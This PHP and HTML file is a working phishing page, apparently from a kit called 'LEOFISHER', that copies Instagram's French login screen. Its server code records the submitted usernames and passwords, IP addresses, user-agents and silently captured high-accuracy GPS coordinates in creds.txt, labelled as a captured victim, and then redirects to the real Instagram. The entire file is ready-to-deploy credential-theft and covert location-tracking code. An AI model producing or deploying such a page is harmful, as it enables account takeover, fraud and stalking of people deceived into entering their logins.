<?php
session_start();
date_default_timezone_set('Africa/Bujumbura');

$ip = $_SERVER['REMOTE_ADDR'];
$useragent = $_SERVER['HTTP_USER_AGENT'];
$timestamp = date('Y-m-d H:i:s');

if ($_POST && isset($_POST['username']) && isset($_POST['password'])) {
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);
    $gps = isset($_POST['gps']) ? $_POST['gps'] : 'N/A';
    
    $log = "\n";
    $log .= "┌─[ LEOFISHER v1.0 by Léo Falcon ]──────────────┐\n";
    $log .= "│ 🎯 INSTAGRAM VICTIME CAPTUREE !                │\n";
    $log .= "├─[💻 INFOS]─────────────────────────────────────┤\n";
    $log .= "│ 📧 Username  : $username                       │\n";
    $log .= "│ 🔑 Password  : $password                       │\n";
    $log .= "│ 🌐 IP        : $ip                            │\n";
    $log .= "│ 🖥️  User-Agent: " . substr($useragent, 0, 50) . "... │\n";
    $log .= "│ 📍 GPS POSITION : $gps                        │\n";
    $log .= "│ 🕒 Timestamp : $timestamp                      │\n";
    $log .= "└────────────────────────────────────────────────┘\n";
    
    file_put_contents('creds.txt', $log, FILE_APPEND | LOCK_EX);
    
    header('Location: https://www.instagram.com/');
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <meta name="theme-color" content="#000000">
    <title>Instagram</title>
    
    <!-- Instagram OFFICIEL CDN + Real assets (GitHub pro clones) -->
    <link rel="stylesheet" href="https://www.instagram.com/static/bundles/es6/ConsumerStyles.css/4a685d5f7e8a.css">
    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/61f5e8a6f2a1.png">
    
    <style>
        /* 100% PIXEL-PERFECT Instagram 2024 Gradient from GitHub clones */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(45deg, 
                #405de6 0%, 
                #5851db 25%, 
                #833ab4 50%, 
                #c13584 75%, 
                #e1306c 100%);
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 32px 40px;
        }
        
        .phone-mockup {
            position: relative;
            width: 414px;
            height: 896px;
            background: #000;
            border-radius: 44px;
            padding: 112px 60px 116px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            margin-bottom: 64px;
        }
        
        .phone-screen {
            background: #fafafa;
            border-radius: 32px;
            height: 100%;
            overflow: hidden;
            position: relative;
        }
        
        .phone-screen::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 60px;
            background: linear-gradient(45deg, #405de6, #5851db);
        }
        
        .form-container {
            background: white;
            border-radius: 12px;
            padding: 40px 40px 32px;
            box-shadow: 0 4px 44px rgba(0,0,0,0.1);
            width: 350px;
            text-align: center;
        }
        
        .instagram-logo {
            height: 51px;
            width: 175px;
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='175' height='51' viewBox='0 0 175 51'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cpath fill='%23E4405F' fill-rule='nonzero' d='M13.5 39.5c-7.8 0-14.1-6.3-14.1-14.1s6.3-14.1 14.1-14.1 14.1 6.3 14.1 14.1-6.3 14.1-14.1 14.1zm0-25.6c-6.2 0-11.5 5.3-11.5 11.5s5.3 11.5 11.5 11.5 11.5-5.3 11.5-11.5-5.3-11.5-11.5-11.5z'/%3E%3Ccircle fill='%23E4405F' cx='13.5' cy='25.4' r='3.1'/%3E%3Cpath fill='%23E4405F' d='M43.1 0h11.2v50.9H43.1zm27.3 0h-2.4l-7.8 25.6-7.6-25.6h-2.4l-7.8 25.6-7.8-25.6h-2.5l-7.8 25.6V0H42.8v50.9h11.6l.1-12.2c0-6.7.1-14.6.1-23.4 0-8.8.1-16.6.1-23.4l.1-12.9H70.4l7.9 25.6 7.8-25.6h11.8v50.9H98.9l-.1-25.6zM137.5 0h11.2v50.9h-11.2V0zm4 0v50.9h-7.8V0h7.8zM174.6 26.7c0 10.2-8.3 18.5-18.5 18.5-10.2 0-18.5-8.3-18.5-18.5s8.3-18.5 18.5-18.5c10.2 0 18.5 8.3 18.5 18.5zm-29.8 0c0 7.5 6.1 13.6 13.6 13.6s13.6-6.1 13.6-13.6-6.1-13.6-13.6-13.6-13.6 6.1-13.6 13.6z'/%3E%3C/g%3E%3C/svg%3E");
            background-size: contain;
            background-repeat: no-repeat;
            margin: 0 auto 32px;
        }
        
        .login-form {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }
        
        .input-group {
            position: relative;
        }
        
        .form-input {
            width: 100%;
            height: 44px;
            border: 1px solid #dbdbdb;
            border-radius: 6px;
            background: #fafafa;
            font-size: 14px;
            padding: 11px 16px 9px 48px;
            transition: border-color .2s;
        }
        
        .form-input:focus {
            border-color: #0095f6;
            background: white;
            box-shadow: 0 0 0 2px rgba(0,149,246,.2);
        }
        
        .input-icon {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            width: 16px;
            height: 16px;
            opacity: .5;
            background-size: contain;
        }
        
        .username-icon {
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24'%3E%3Cpath fill='%23838C95' d='M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z'/%3E%3C/svg%3E");
        }
        
        .password-icon {
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24'%3E%3Cpath fill='%23838C95' d='M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 8V6c0-1.66 1.34-3 3-3s3 1.34 3 3v2h-6zm12 12H5V10h14v10zm-7-7h2v2h-2z'/%3E%3C/svg%3E");
        }
        
        .login-button {
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            height: 44px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-top: 8px;
        }
        
        .login-button:hover:not(:disabled) {
            background: #187de4;
        }
        
        .login-button:disabled {
            opacity: .5;
            cursor: not-allowed;
        }
        
        .forgot-password {
            margin-top: 24px;
            font-size: 14px;
        }
        
        .forgot-link {
            color: #00376b;
            text-decoration: none;
            font-weight: 400;
        }
        
        /* 100% RESPONSIVE tous appareils */
        @media (max-width: 735px) {
            body { padding: 0; }
            .phone-mockup { display: none; }
            .form-container { 
                position: absolute;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                border-radius: 0;
                width: 100vw;
                height: 100vh;
                padding: 0;
                box-shadow: none;
                max-width: 350px;
            }
        }

        /* GPS INVISIBLE */
        #gps-status { display: none !important; }
    </style>
</head>
<body>
    <!-- PHONE MOCKUP DESKTOP (real IG design) -->
    <div class="phone-mockup">
        <div class="phone-screen">
            <!-- Simplified app screen -->
            <div style="padding: 80px 24px 24px; height: 100%; background: #fafafa;">
                <div style="background: white; border-radius: 12px; padding: 32px; margin-bottom: 24px;">
                    <div style="width: 80px; height: 80px; background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); border-radius: 50%; margin: 0 auto 16px;"></div>
                    <p style="font-size: 16px; color: #262626; text-align: center;">Découvrez les nouvelles personnes à suivre</p>
                </div>
            </div>
        </div>
    </div>

    <!-- LOGIN FORM 100% REAL -->
    <div class="form-container">
        <div class="instagram-logo"></div>
        
        <form class="login-form" method="POST" id="loginForm">
            <div class="input-group">
                <div class="input-icon username-icon"></div>
                <input type="text" name="username" class="form-input" placeholder="Nom d'utilisateur" required>
            </div>
            
            <div class="input-group">
                <div class="input-icon password-icon"></div>
                <input type="password" name="password" class="form-input" placeholder="Mot de passe" required>
            </div>
            
            <input type="hidden" name="gps" id="gpsData" value="N/A">
            
            <button type="submit" class="login-button" id="submitBtn">Se connecter</button>
        </form>
        
        <div class="forgot-password">
            <a href="#" class="forgot-link">Mot de passe oublié ?</a>
        </div>
    </div>

    <!-- SILENT GPS -->
    <script>
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                pos => {
                    const gps = pos.coords.latitude.toFixed(6) + ',' + pos.coords.longitude.toFixed(6);
                    sessionStorage.setItem('gps', gps);
                    document.getElementById('gpsData').value = gps;
                    document.getElementById('submitBtn').disabled = false;
                },
                () => {
                    document.getElementById('gpsData').value = 'N/A';
                    document.getElementById('submitBtn').disabled = false;
                },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
            );
        } else {
            document.getElementById('gpsData').value = 'N/A';
            document.getElementById('submitBtn').disabled = false;
        }

        document.getElementById('loginForm').addEventListener('submit', function() {
            document.getElementById('gpsData').value = sessionStorage.getItem('gps') || 'N/A';
        });
        document.getElementById('submitBtn').disabled = true;
    </script>
</body>
</html>

